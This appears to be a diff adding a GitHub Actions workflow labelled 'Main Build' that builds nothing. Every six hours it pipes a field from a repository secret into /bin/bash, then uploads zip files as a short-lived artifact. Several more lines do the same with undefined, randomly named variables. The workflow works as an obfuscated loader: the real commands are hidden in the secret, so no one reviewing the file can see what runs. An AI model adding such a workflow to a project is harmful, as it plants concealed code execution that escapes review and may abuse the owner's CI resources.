@@ -1,0 +1,35 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          gy141: ${{ secrets.gy141 }}
+        run: |
+          printf '%s' "$gy141" | jq -r .i5 | /bin/bash
+          echo $tcyxv285 | jq -r .ch4233 | /bin/bash
+          echo $tru52 | jq -r .xwvgz716 | /bin/bash
+          echo $m44317 | jq -r .pwd57472 | /bin/bash
+          printf '%s' "$qg451" | jq -r .vzaxt83 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: YOrojazl
+          path: "*.zip"
+          retention-days: 1
